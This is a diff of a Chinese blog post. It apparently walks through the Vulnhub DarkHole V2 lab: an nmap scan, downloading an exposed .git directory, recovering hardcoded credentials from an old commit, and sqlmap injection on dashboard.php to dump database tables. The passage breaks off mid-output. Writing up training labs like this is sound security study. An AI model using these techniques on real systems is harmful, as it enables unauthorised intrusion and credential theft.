@@ -49,7 +49,7 @@
         content="2022-04-20">
       <meta 
         property="og:article:modified_time" 
-        content="2022-04-20">
+        content="2022-05-16">
       <meta 
         property="og:article:author" 
         content="CBear">
@@ -345,7 +345,7 @@
     
     
       <span class="dot"></span>
-      <span>2.7k words</span>
+      <span>2.3k words</span>
     
   </div>
   
@@ -421,267 +421,267 @@
 <p>不再赘述，可看之前的<strong>Vulnhub</strong>相关文章。  </p>
 </blockquote>
 <h2 id="1-_u4FE1_u606F_u6536_u96C6"><a href="#1-_u4FE1_u606F_u6536_u96C6" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><blockquote>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~]
-└─# nmap -A -p- 192.168.81.131
-Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-20 00:50 CDT
-Nmap scan report for 192.168.81.131
-Host is up (0.00037s latency).
-Not shown: 65533 closed tcp ports (reset)
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nmap -A -p- 192.168.81.131</span>
+Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2022</span>-04-20 00:50 CDT
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.81.131
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00037s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
 PORT   STATE SERVICE VERSION
-22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 57:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d (RSA)
-|   256 cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 (ECDSA)
-|_  256 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 (ED25519)
-80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-cookie-flags: 
-|   &#x2F;: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-title: DarkHole V2
-| http-git: 
-|   192.168.81.131:80&#x2F;.git&#x2F;
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
-|_    Last commit message: i changed login.php file for more secure 
-|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)
-MAC Address: 00:0C:29:9A:BA:9C (VMware)
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.3 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">57</span>:b1:f5:64:28:98:91:51:6d:70:76:6e:a5:52:43:5d <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> cc:64:fd:7c:d8:5e:48:8a:28:98:91:b9:e4:1e:6d:a8 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> 9e:77:08:a4:52:9f:33:8d:96:19:ba:75:71:27:bd:60 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
+<span class="token operator">|</span> http-cookie-flags: 
+<span class="token operator">|</span>   /: 
+<span class="token operator">|</span>     PHPSESSID: 
+<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
+<span class="token operator">|</span>_http-title: DarkHole V2
+<span class="token operator">|</span> http-git: 
+<span class="token operator">|</span>   <span class="token number">192.168</span>.81.131:80/.git/
+<span class="token operator">|</span>     Git repository found<span class="token operator">!</span>
+<span class="token operator">|</span>     Repository description: Unnamed repository<span class="token punctuation">;</span> edit this <span class="token function">file</span> <span class="token string">'description'</span> to name the<span class="token punctuation">..</span>.
+<span class="token operator">|</span>_    Last commit message: i changed login.php <span class="token function">file</span> <span class="token keyword">for</span> <span class="token function">more</span> secure 
+<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
+MAC Address: 00:0C:29:9A:BA:9C <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
 Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.6
-Network Distance: 1 hop
-Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.6</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel               <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>启动了<strong>ssh</strong>和<strong>http</strong>，访问<code>192.168.81.131:80/.git/</code>是一个git目录。  </p>
 </blockquote>
 <h2 id="2-_u4EE3_u7801_u5BA1_u8BA1"><a href="#2-_u4EE3_u7801_u5BA1_u8BA1" class="headerlink" title="2.代码审计"></a>2.代码审计</h2><blockquote>
-<p>直接访问80端口，是一个登陆界面，找不到有效的用户名与密码。<br>把git代码拉下来：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test]
-└─# wget -r http:&#x2F;&#x2F;192.168.81.131&#x2F;.git&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>查看<code>config.php</code>文件，找到连接mysql数据库<strong>darkhole_2</strong>的用户名<strong>root</strong>，口令为<strong>空</strong>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131&#x2F;config]
-└─# cat config.php 
-&lt;?php
-$connect &#x3D; new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;darkhole_2&quot;);     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>查看<code>index.php</code>文件，找到关键部分，存在URL <code>/dashboard.php?id=</code> 。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# cat index.php
-......
-&lt;?php if(isset($_SESSION[&#39;userid&#39;]))&#123; 
- ?&gt;
- &lt;li&gt;&lt;a href&#x3D;&quot;logout.php&quot;&gt;logout&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
- &lt;li&gt;&lt;a href&#x3D;&quot;dashboard.php?id&#x3D;&lt;?php echo $_SESSION[&#39;userid&#39;]; ?&gt;&quot;&gt;Dashboard&lt;&#x2F;a&gt; &lt;&#x2F;li&gt;
- &lt;?php
-&#125;else&#123;
- ?&gt;
- &lt;li&gt;&lt;a href&#x3D;&quot;login.php&quot;&gt;Login&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
- &lt;?php
-&#125; ?&gt;
-......  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看<code>login.php</code>文件，找到关键部分，登录校验用户<code>email</code>、<code>password</code>和<code>id=1</code>，这里写死了<strong>id=1</strong>，应该是只允许一个用户登陆80的意思(?)。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# cat login.php    
-&lt;?php
-session_start();
-require &#39;config&#x2F;config.php&#39;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D; &#39;POST&#39;)&#123;
-   $email &#x3D; mysqli_real_escape_string($connect,htmlspecialchars($_POST[&#39;email&#39;]));
-   $pass &#x3D; mysqli_real_escape_string($connect,htmlspecialchars($_POST[&#39;password&#39;]));
-   $check &#x3D; $connect-&gt;query(&quot;select * from users where email&#x3D;&#39;$email&#39; and password&#x3D;&#39;$pass&#39; and id&#x3D;1&quot;);
-   if($check-&gt;num_rows)&#123;
-       $_SESSION[&#39;userid&#39;] &#x3D; 1;
-       header(&quot;location:dashboard.php&quot;);
-       die();
-   &#125;
+<p>直接访问80端口，是一个登陆界面，找不到有效的用户名与密码。<br>把git代码拉下来：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test<span class="token punctuation">]</span>
+└─<span class="token comment"># wget -r http://192.168.81.131/.git/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>查看<code>config.php</code>文件，找到连接mysql数据库<strong>darkhole_2</strong>的用户名<strong>root</strong>，口令为<strong>空</strong>：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131/config<span class="token punctuation">]</span>
+└─<span class="token comment"># cat config.php </span>
+<span class="token operator">&lt;</span>?php
+<span class="token variable">$connect</span> <span class="token operator">=</span> new mysqli<span class="token punctuation">(</span><span class="token string">"localhost"</span>,<span class="token string">"root"</span>,<span class="token string">""</span>,<span class="token string">"darkhole_2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>查看<code>index.php</code>文件，找到关键部分，存在URL <code>/dashboard.php?id=</code> 。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># cat index.php</span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
+<span class="token operator">&lt;</span>?php if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">&#123;</span> 
+ ?<span class="token operator">></span>
+ <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"logout.php"</span><span class="token operator">></span>logout<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
+ <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"dashboard.php?id=&lt;?php echo <span class="token variable">$_SESSION</span>['userid']; ?>"</span><span class="token operator">></span>Dashboard<span class="token operator">&lt;</span>/a<span class="token operator">></span> <span class="token operator">&lt;</span>/li<span class="token operator">></span>
+ <span class="token operator">&lt;</span>?php
+<span class="token punctuation">&#125;</span>else<span class="token punctuation">&#123;</span>
+ ?<span class="token operator">></span>
+ <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"login.php"</span><span class="token operator">></span>Login<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>
+ <span class="token operator">&lt;</span>?php
+<span class="token punctuation">&#125;</span> ?<span class="token operator">></span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看<code>login.php</code>文件，找到关键部分，登录校验用户<code>email</code>、<code>password</code>和<code>id=1</code>，这里写死了<strong>id=1</strong>，应该是只允许一个用户登陆80的意思(?)。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># cat login.php    </span>
+<span class="token operator">&lt;</span>?php
+session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+require <span class="token string">'config/config.php'</span><span class="token punctuation">;</span>
+if<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   <span class="token variable">$email</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$connect</span>,htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+   <span class="token variable">$pass</span> <span class="token operator">=</span> mysqli_real_escape_string<span class="token punctuation">(</span><span class="token variable">$connect</span>,htmlspecialchars<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+   <span class="token variable">$check</span> <span class="token operator">=</span> <span class="token variable">$connect</span>-<span class="token operator">></span>query<span class="token punctuation">(</span><span class="token string">"select * from users where email='<span class="token variable">$email</span>' and password='<span class="token variable">$pass</span>' and id=1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   if<span class="token punctuation">(</span><span class="token variable">$check</span>-<span class="token operator">></span>num_rows<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+       header<span class="token punctuation">(</span><span class="token string">"location:dashboard.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       die<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
 
-&#125;
-?&gt;
-......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>将从<code>index.php</code>获得的<code>/dashboard.php?id=</code>与<code>login.php</code>获得的<code>id=1</code>结合，直接访问，响应Not Allowed：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# curl http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;1
-Not Allowed                                                                                                                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>想了一下git的特性，每一次合并分支都会有记录，故查看更新记录。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# git log
-commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -&gt; master)
-Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
-Date:   Mon Aug 30 13:14:32 2021 +0300
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>将从<code>index.php</code>获得的<code>/dashboard.php?id=</code>与<code>login.php</code>获得的<code>id=1</code>结合，直接访问，响应Not Allowed：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># curl http://192.168.81.131/dashboard.php?id=1</span>
+Not Allowed                                                                                                                                                        <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>想了一下git的特性，每一次合并分支都会有记录，故查看更新记录。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># git log</span>
+commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>
+Author: Jehad Alqurashi <span class="token operator">&lt;</span>anmar-v7@hotmail.com<span class="token operator">></span>
+Date:   Mon Aug <span class="token number">30</span> <span class="token number">13</span>:14:32 <span class="token number">2021</span> +0300
 
-   i changed login.php file for more secure
+   i changed login.php <span class="token function">file</span> <span class="token keyword">for</span> <span class="token function">more</span> secure
 
 commit a4d900a8d85e8938d3601f3cef113ee293028e10
-Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
-Date:   Mon Aug 30 13:06:20 2021 +0300
+Author: Jehad Alqurashi <span class="token operator">&lt;</span>anmar-v7@hotmail.com<span class="token operator">></span>
+Date:   Mon Aug <span class="token number">30</span> <span class="token number">13</span>:06:20 <span class="token number">2021</span> +0300
 
-   I added login.php file with default credentials
+   I added login.php <span class="token function">file</span> with default credentials
 
 commit aa2a5f3aa15bb402f2b90a07d86af57436d64917
-Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;
-Date:   Mon Aug 30 13:02:44 2021 +0300
+Author: Jehad Alqurashi <span class="token operator">&lt;</span>anmar-v7@hotmail.com<span class="token operator">></span>
+Date:   Mon Aug <span class="token number">30</span> <span class="token number">13</span>:02:44 <span class="token number">2021</span> +0300
 
-   First Initialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>注意到<strong>a4d900</strong>，作者在login.php携带了认证信息，想办法回退到<strong>a4d900</strong>版本，并查看<strong>login.php</strong>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# git reset --hard a4d900
-HEAD is now at a4d900a I added login.php file with default credentials
+   First Initialize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>注意到<strong>a4d900</strong>，作者在login.php携带了认证信息，想办法回退到<strong>a4d900</strong>版本，并查看<strong>login.php</strong>。<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># git reset --hard a4d900</span>
+HEAD is now at a4d900a I added login.php <span class="token function">file</span> with default credentials
 
-┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# cat login.php    
-&lt;?php
-session_start();
-require &#39;config&#x2F;config.php&#39;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;] &#x3D;&#x3D; &#39;POST&#39;)&#123;
-   if($_POST[&#39;email&#39;] &#x3D;&#x3D; &quot;lush@admin.com&quot; &amp;&amp; $_POST[&#39;password&#39;] &#x3D;&#x3D; &quot;321&quot;)&#123;
-       $_SESSION[&#39;userid&#39;] &#x3D; 1;
-       header(&quot;location:dashboard.php&quot;);
-       die();
-   &#125;
+┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># cat login.php    </span>
+<span class="token operator">&lt;</span>?php
+session_start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+require <span class="token string">'config/config.php'</span><span class="token punctuation">;</span>
+if<span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+   if<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"lush@admin.com"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"321"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+       header<span class="token punctuation">(</span><span class="token string">"location:dashboard.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       die<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token punctuation">&#125;</span>
 
-&#125;
-?&gt;
-......                                                                                                                                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>找到账号密码<a href="mailto:`lush@admin.com">`lush@admin.com</a>:321`。</p>
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span>
+<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>                                                                                                                                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>找到账号密码 <a href="mailto:**lush@admin.com">**lush@admin.com</a>:321**。</p>
 </blockquote>
 <h2 id="3-getshell"><a href="#3-getshell" class="headerlink" title="3.getshell"></a>3.getshell</h2><blockquote>
-<p>用得到的账号密码登陆22，登不上去。<br>用得到的账号密码登陆80，得到URL <code>http://192.168.81.131/dashboard.php?id=1</code> 是一个用户属性页面。<br>把URL和Cookie丢到<code>sqlmap</code>里跑一下：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 --dbs --batch
-[02:26:14] [INFO] fetching database names
-available databases [5]:
-[*] darkhole_2
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在<strong>2.代码审计</strong>中的<code>config.php</code>就已经知道了我们使用的数据库是<code>darkhole_2</code>，继续爆表：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 --tables --batch 
-[02:28:18] [INFO] fetching tables for database: &#39;darkhole_2&#39;
+<p>用得到的账号密码登陆22，登不上去。<br>用得到的账号密码登陆80，得到URL <code>http://192.168.81.131/dashboard.php?id=1</code> 是一个用户属性页面。<br>把URL和Cookie丢到<code>sqlmap</code>里跑一下：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 --dbs --batch</span>
+<span class="token punctuation">[</span>02:26:14<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching database names
+available databases <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> darkhole_2
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> mysql
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> performance_schema
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> sys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在<strong>2.代码审计</strong>中的<code>config.php</code>就已经知道了我们使用的数据库是<code>darkhole_2</code>，继续爆表：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 --tables --batch </span>
+<span class="token punctuation">[</span>02:28:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching tables <span class="token keyword">for</span> database: <span class="token string">'darkhole_2'</span>
 Database: darkhole_2
-[2 tables]
+<span class="token punctuation">[</span><span class="token number">2</span> tables<span class="token punctuation">]</span>
 +-------+
-| ssh   |
-| users |
-+-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看表<code>ssh</code>中的字段及内容：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root㉿kali)-[~&#x2F;Tools&#x2F;test&#x2F;192.168.81.131]
-└─# sqlmap -u http:&#x2F;&#x2F;192.168.81.131&#x2F;dashboard.php?id&#x3D;* --cookie PHPSESSID&#x3D;t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh --columns --batch
-[02:29:38] [INFO] fetching columns for table &#39;ssh&#39; in database &#39;darkhole_2&#39;
+<span class="token operator">|</span> <span class="token function">ssh</span>   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token function">users</span> <span class="token operator">|</span>
++-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>查看表<code>ssh</code>中的字段及内容：<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Tools/test/192.168.81.131<span class="token punctuation">]</span>
+└─<span class="token comment"># sqlmap -u http://192.168.81.131/dashboard.php?id=* --cookie PHPSESSID=t74nuvqnmod9ghct6a0q8q6mo8 -D darkhole_2 -T ssh --columns --batch</span>
+<span class="token punctuation">[</span>02:29:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching columns <span class="token keyword">for</span> table <span class="token string">'ssh'</span> <span class="token keyword">in</span> database <span class="token string">'darkhole_2'</span>
 Database: darkhole_2
-Table: ssh
-[3 columns]
+Table: <span class="token function">ssh</span>
+<span class="token punctuation">[</span><span class="token number">3</span> columns<span class="token punctuation">]</span>
 +--------+--------------+
-| Column | Type         |
+<span class="token operator">|</span> Column <span class="token operator">|</span> Type         <span class="token operator">|</span>
 +--------+--------------+
-| user   | varchar(100) |
-| id     | int          |
-| pass   | varchar(100) |
+<span class="token operator">|</span> user   <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">|</span>
